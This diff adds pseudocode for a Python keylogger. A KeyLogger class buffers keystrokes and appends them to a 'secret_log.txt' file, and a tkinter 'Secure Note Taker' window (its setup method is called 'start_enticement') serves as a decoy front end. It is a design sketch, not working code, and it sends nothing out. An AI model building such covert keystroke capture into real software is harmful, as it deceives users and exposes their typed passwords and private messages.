@@ -1,0 +1,80 @@
+#This is the pseudocode for logging_tools.py
+#3 Classes: BaseLogger, KeyLogger (inherits from BaseLogger), and UserInterface
+
+IMPORT tkinter
+IMPORT messagebox from tkinter
+IMPORT datetime
+
+CLASS BaseLogger:
+    METHOD __init__(filename):
+        SET self.filename = filename
+
+    METHOD write_to_file(data):
+        TRY:
+            GET current timestamp formatted as [YYYY-MM-DD HH:MM:SS]
+            OPEN self.filename in append mode
+            WRITE "[timestamp] data" to file with newline
+            CLOSE file
+        EXCEPT Exception as e:
+            PRINT error message with filename and exception
+
+CLASS KeyLogger (Inherits from BaseLogger):
+    METHOD __init__(filename = "secret_log.txt"):
+        CALL parent __init__(filename)
+        SET self.current_buffer = "" to store keys until Enter is pressed
+        
+        TRY:
+            OPEN self.filename in append mode (creates file if it doesn't exist)
+            CLOSE file immediately
+        EXCEPT Exception as e:
+            PRINT error message about file creation failure
+    
+    METHOD process_key(key):
+        CONVERT key to string and remove quotes
+        
+        IF key is space:
+            ADD space character to current_buffer
+        ELSE IF key is enter:
+            IF current_buffer is not empty:
+                CALL write_to_file("Captured: " + current_buffer)
+                RESET current_buffer to empty string
+        ELSE IF key is backspace:
+            REMOVE last character from current_buffer
+        ELSE IF key is NOT a special key (does not contain "Key"):
+            ADD key character to current_buffer
+
+CLASS UserInterface:
+    METHOD __init__():
+        CREATE tkinter window (Tk())
+        SET window title to "Secure Note Taker"
+        SET window geometry to 400x350
+    
+    METHOD start_enticement():
+        CREATE label widget with text "Welcome to the Secure Note Taker!" (bold, Arial 12)
+        PACK label with pady=10
+        
+        CREATE text widget (height=10, width=40, wrap=WORD)
+        PACK text widget with pady=10, padx=10
+        
+        CREATE frame for buttons
+        PACK button frame with pady=10
+        
+        CREATE "Save Notes" button that calls save_notes() method
+        PACK button on left side with padx=5
+        
+        CREATE "Exit" button that destroys window
+        PACK button on left side with padx=5
+        
+        START mainloop to display window
+    
+    METHOD save_notes():
+        GET all text from text widget (from position 1.0 to END)
+        STRIP whitespace from text
+        
+        TRY:
+            OPEN "public_notes.txt" in write mode
+            WRITE user_content to file
+            CLOSE file
+            SHOW messagebox info "Saved" with message "Your notes have been saved!"
+        EXCEPT Exception as e:
+            SHOW messagebox error "Error" with message about save failure
